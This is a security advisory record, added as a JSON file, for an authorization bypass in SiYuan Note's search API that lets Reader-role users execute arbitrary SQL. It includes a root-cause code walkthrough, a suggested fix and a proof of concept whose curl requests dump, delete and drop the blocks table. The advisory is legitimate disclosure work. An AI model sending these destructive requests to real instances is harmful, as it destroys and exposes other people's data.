@@ -1,0 +1,45 @@
+{
+  "id": "GHSA-j7wh-x834-p3r7",
+  "modified": "2026-03-16T21:01:34.981854Z",
+  "published": "2026-03-16T20:44:52Z",
+  "aliases": [
+    "CVE-2026-32767"
+  ],
+  "summary": "SiYuan: Authorization Bypass Allows Arbitrary SQL Execution via Search API",
+  "details": "## Summary\n\nSiYuan Note v3.6.0 (and likely prior versions) contains an authorization bypass vulnerability in the `/api/search/fullTextSearchBlock` endpoint. When the `method` parameter is set to `2`, the endpoint passes user-supplied input directly as a raw SQL statement to the underlying SQLite database without any authorization or read-only checks. This allows any authenticated user — including those with the `Reader` role — to execute arbitrary SQL statements (SELECT, DELETE, UPDATE, DROP TABLE, etc.) against the application's database.\n\nThis is inconsistent with the application's own security model: the dedicated SQL endpoint (`/api/query/sql`) correctly requires both `CheckAdminRole` and `CheckReadonly` middleware, but the search endpoint bypasses these controls entirely.\n\n## Root Cause Analysis\n\n### The Vulnerable Endpoint\n\n**File:** `kernel/api/router.go`, line 188\n\n```go\nginServer.Handle(\"POST\", \"/api/search/fullTextSearchBlock\", model.CheckAuth, fullTextSearchBlock)\n```\n\nThis endpoint only applies `model.CheckAuth`, which permits **any** authenticated role (Administrator, Editor, or Reader).\n\n### The Properly Protected Endpoint (for comparison)\n\n**File:** `kernel/api/router.go`, line 177\n\n```go\nginServer.Handle(\"POST\", \"/api/query/sql\", model.CheckAuth, model.CheckAdminRole, model.CheckReadonly, SQL)\n```\n\nThis endpoint correctly chains `CheckAdminRole` and `CheckReadonly`, restricting SQL execution to administrators in read-write mode.\n\n### The Vulnerable Code Path\n\n**File:** `kernel/api/search.go`, lines 389-411\n\n```go\nfunc fullTextSearchBlock(c *gin.Context) {\n    // ...\n    page, pageSize, query, paths, boxes, types, method, orderBy, groupBy := parseSearchBlockArgs(arg)\n    blocks, matchedBlockCount, matchedRootCount, pageCount, docMode :=\n        model.FullTextSearchBlock(query, boxes, paths, types, method, orderBy, groupBy, page, pageSize)\n    // ...\n}\n```\n\n**File:** `kernel/model/search.go`, lines 1205-1206\n\n```go\ncase 2: // SQL\n    blocks, matchedBlockCount, matchedRootCount = searchBySQL(query, beforeLen, page, pageSize)\n```\n\nWhen `method=2`, the raw `query` string is passed directly to `searchBySQL()`.\n\n**File:** `kernel/model/search.go`, lines 1460-1462\n\n```go\nfunc searchBySQL(stmt string, beforeLen, page, pageSize int) (ret []*Block, ...) {\n    stmt = strings.TrimSpace(stmt)\n    blocks := sql.SelectBlocksRawStmt(stmt, page, pageSize)\n```\n\n**File:** `kernel/sql/block_query.go`, lines 566-569, 713-714\n\n```go\nfunc SelectBlocksRawStmt(stmt string, page, limit int) (ret []*Block) {\n    parsedStmt, err := sqlparser.Parse(stmt)\n    if err != nil {\n        return selectBlocksRawStmt(stmt, limit)  // Falls through to raw execution\n    }\n    // ...\n}\n\nfunc selectBlocksRawStmt(stmt string, limit int) (ret []*Block) {\n    rows, err := query(stmt)  // Executes arbitrary SQL\n    // ...\n}\n```\n\n**File:** `kernel/sql/database.go`, lines 1327-1337\n\n```go\nfunc query(query string, args ...interface{}) (*sql.Rows, error) {\n    // ...\n    return db.Query(query, args...)  // Go's database/sql db.Query — executes ANY SQL\n}\n```\n\nGo's `database/sql` `db.Query()` will execute any SQL statement, including `DELETE`, `UPDATE`, `DROP TABLE`, `INSERT`, etc. The returned `*sql.Rows` will simply be empty for non-SELECT statements, but the destructive operation is still executed.\n\n### Authorization Model\n\n**File:** `kernel/model/session.go`, lines 201-210\n\n```go\nfunc CheckAuth(c *gin.Context) {\n    // Already authenticated via JWT\n    if role := GetGinContextRole(c); IsValidRole(role, []Role{\n        RoleAdministrator,\n        RoleEditor,\n        RoleReader,       // \u003c-- Reader role passes CheckAuth\n    }) {\n        c.Next()\n        return\n    }\n    // ...\n}\n```\n\n**File:** `kernel/model/session.go`, lines 380-386\n\n```go\nfunc CheckAdminRole(c *gin.Context) {\n    if IsAdminRoleContext(c) {\n        c.Next()\n    } else {\n        c.AbortWithStatus(http.StatusForbidden)  // \u003c-- This check is MISSING on the search endpoint\n    }\n}\n```\n\n## Proof of Concept\n\n### Prerequisites\n- SiYuan instance accessible over the network (e.g., Docker deployment)\n- Valid authentication as any user role (including `Reader`)\n\n### Steps to Reproduce\n\n1. Authenticate to SiYuan and obtain a valid session cookie or API token.\n\n2. **Read all data (confidentiality breach):**\n```bash\ncurl -X POST http://\u003ctarget\u003e:6806/api/search/fullTextSearchBlock \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Token \u003creader_token\u003e\" \\\n  -d '{\"method\": 2, \"query\": \"SELECT * FROM blocks LIMIT 100\"}'\n```\n\n3. **Delete all blocks (integrity/availability breach):**\n```bash\ncurl -X POST http://\u003ctarget\u003e:6806/api/search/fullTextSearchBlock \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Token \u003creader_token\u003e\" \\\n  -d '{\"method\": 2, \"query\": \"DELETE FROM blocks\"}'\n```\n\n4. **Drop tables (availability breach):**\n```bash\ncurl -X POST http://\u003ctarget\u003e:6806/api/search/fullTextSearchBlock \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Token \u003creader_token\u003e\" \\\n  -d '{\"method\": 2, \"query\": \"DROP TABLE blocks\"}'\n```\n\n5. **Compare with the properly protected endpoint** (should return HTTP 403 for Reader role):\n```bash\ncurl -X POST http://\u003ctarget\u003e:6806/api/query/sql \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Token \u003creader_token\u003e\" \\\n  -d '{\"stmt\": \"SELECT * FROM blocks LIMIT 10\"}'\n```\n\n### Expected Behavior\nThe search endpoint should reject SQL execution for non-admin users, or at minimum enforce read-only access, consistent with `/api/query/sql`.\n\n### Actual Behavior\nAny authenticated user (including Reader role) can execute arbitrary SQL including destructive operations.\n\n## Impact\n\nIn a multi-user deployment (e.g., Docker with published access, or any network-accessible instance with access authorization code):\n\n- **Confidentiality:** A Reader-role user can read all data in the SQLite database, including blocks, assets, references, and configuration data they should not have access to.\n- **Integrity:** A Reader-role user can modify or delete any data in the database, despite having read-only access by design.\n- **Availability:** A Reader-role user can drop tables or corrupt the database, rendering the application unusable.\n\n## Suggested Fix\n\nAdd `CheckAdminRole` and `CheckReadonly` middleware to the search endpoint, or add explicit validation that only SELECT statements are accepted when `method=2`:\n\n**Option A — Restrict method=2 to admin (recommended):**\n\nIn `kernel/api/search.go`, add a role check when `method=2`:\n\n```go\nfunc fullTextSearchBlock(c *gin.Context) {\n    // ...\n    page, pageSize, query, paths, boxes, types, method, orderBy, groupBy := parseSearchBlockArgs(arg)\n\n    // SQL mode requires admin privileges, consistent with /api/query/sql\n    if method == 2 \u0026\u0026 !model.IsAdminRoleContext(c) {\n        ret.Code = -1\n        ret.Msg = \"SQL search requires administrator privileges\"\n        return\n    }\n    // ...\n}\n```\n\n**Option B — Enforce SELECT-only for non-admin users:**\n\nValidate the parsed SQL to ensure only SELECT statements are executed when the user is not an administrator.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/siyuan-note/siyuan/kernel",
+        "purl": "pkg:golang/github.com/siyuan-note/siyuan/kernel"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.0.0-20260313024916-fd6526133bb3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-j7wh-x834-p3r7/GHSA-j7wh-x834-p3r7.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/siyuan-note/siyuan/security/advisories/GHSA-j7wh-x834-p3r7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/siyuan-note/siyuan"
+    }
+  ]
+}
